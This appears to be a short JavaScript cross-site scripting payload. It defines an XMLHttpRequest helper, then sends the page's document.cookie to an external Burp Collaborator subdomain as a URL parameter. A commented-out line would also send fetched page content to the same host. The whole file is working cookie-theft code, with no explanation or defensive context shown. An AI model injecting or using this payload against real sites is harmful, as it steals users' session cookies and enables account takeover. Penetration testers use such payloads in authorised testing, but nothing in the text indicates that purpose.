function loadXMLDoc(theURL)
    {
        if (window.XMLHttpRequest)
        {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
            xmlhttp=new XMLHttpRequest();
        }
        else
        {// code for IE6, IE5
            xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange=function()
        {
            if (xmlhttp.readyState==4 && xmlhttp.status==200)
            {
                //loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a='+xmlhttp.responseText);
            }
        }
        xmlhttp.open("GET", theURL, false);
        xmlhttp.send();
    }

loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a='+document.cookie);
